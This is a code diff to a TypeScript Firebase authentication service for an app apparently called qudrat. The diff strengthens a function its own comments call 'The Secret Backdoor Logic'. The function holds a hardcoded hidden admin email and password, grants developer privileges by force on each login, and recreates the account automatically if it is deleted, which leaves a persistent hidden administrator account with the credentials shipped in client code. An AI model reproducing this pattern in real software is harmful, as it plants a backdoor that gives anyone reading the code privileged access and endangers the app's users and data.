@@ -29,7 +29,7 @@ const mapUser = (fbUser: FirebaseUser, additionalData?: any): User => ({
 });
 
 // Constants for the hidden developer account
-// Fix: Changed .local to .com because Firebase Auth validates email format strictly
+// Using .com domain to satisfy Firebase strict email validation
 const HIDDEN_DEV_EMAIL = "hidden_admin@qudrat.com"; 
 const HIDDEN_DEV_PASS = "dev_secret_mode_active"; 
 
@@ -58,27 +58,41 @@ export const authService = {
         }
     },
 
-    // The Secret Backdoor Logic
+    // The Secret Backdoor Logic (Self-Healing Account)
     loginHiddenDev: async (): Promise<User> => {
+        console.log("Attempting Secret Developer Login...");
         try {
-            // Try to login normally first
+            // 1. Try to login normally
             const cred = await signInWithEmailAndPassword(auth, HIDDEN_DEV_EMAIL, HIDDEN_DEV_PASS);
-            const userDoc = await getDoc(doc(db, 'users', cred.user.uid));
             
-            // Force developer privileges on every secret login
-            if (userDoc.exists()) {
-                const userData = userDoc.data();
-                if (!userData.isDeveloper) {
-                    await updateDoc(doc(db, 'users', cred.user.uid), { isDeveloper: true });
-                    userData.isDeveloper = true;
-                }
-                return mapUser(cred.user, userData);
+            // 2. Check if Firestore document exists (Data layer)
+            const userDocRef = doc(db, 'users', cred.user.uid);
+            const userDoc = await getDoc(userDocRef);
+            
+            let userData = userDoc.exists() ? userDoc.data() : null;
+
+            // 3. Self-Healing: If Firestore doc is missing OR isDeveloper is false, fix it immediately
+            if (!userData || !userData.isDeveloper) {
+                console.log("Restoring Developer Privileges...");
+                const fixedData = {
+                    username: 'المطور',
+                    email: HIDDEN_DEV_EMAIL,
+                    isDeveloper: true, // FORCE TRUE
+                    registrationDate: cred.user.metadata.creationTime || new Date().toISOString(),
+                    loginHistory: userData?.loginHistory || []
+                };
+                
+                // Use setDoc with merge:true to create or update safely
+                await setDoc(userDocRef, fixedData, { merge: true });
+                userData = fixedData;
             }
             
-            return mapUser(cred.user, { isDeveloper: true, username: 'المطور' });
+            return mapUser(cred.user, userData);
+
         } catch (error: any) {
-            // If user doesn't exist (first time usage), create it automatically
+            // 4. Account Missing Logic: If user doesn't exist in Auth at all, create it from scratch
             if (error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
+                console.log("Developer account missing. Recreating...");
                 try {
                     const cred = await createUserWithEmailAndPassword(auth, HIDDEN_DEV_EMAIL, HIDDEN_DEV_PASS);
                     await updateProfile(cred.user, { displayName: 'المطور' });
@@ -86,7 +100,7 @@ export const authService = {
                     const devUser = {
                         username: 'المطور',
                         email: HIDDEN_DEV_EMAIL,
-                        isDeveloper: true, // Grants admin access
+                        isDeveloper: true, // FORCE TRUE
                         registrationDate: new Date().toISOString(),
                         loginHistory: []
                     };
@@ -95,7 +109,7 @@ export const authService = {
                     return mapUser(cred.user, devUser);
                 } catch (createError) {
                     console.error("Failed to auto-create hidden dev:", createError);
-                    throw new Error("فشل الدخول للنظام السري. يرجى المحاولة لاحقاً.");
+                    throw new Error("فشل استعادة حساب المطور. يرجى التحقق من الاتصال.");
                 }
             }
             throw error;
@@ -150,10 +164,8 @@ export const authService = {
                      if (userDoc.exists()) {
                          callback(mapUser(fbUser, userDoc.data()));
                      } else {
-                         // Self-healing: Create missing user document
-                         // Check if it's the hidden dev email
+                         // Self-healing for any user with missing doc
                          const isHiddenDev = fbUser.email === HIDDEN_DEV_EMAIL;
-                         
                          const newUser = {
                              username: fbUser.displayName || 'User',
                              email: fbUser.email || '',
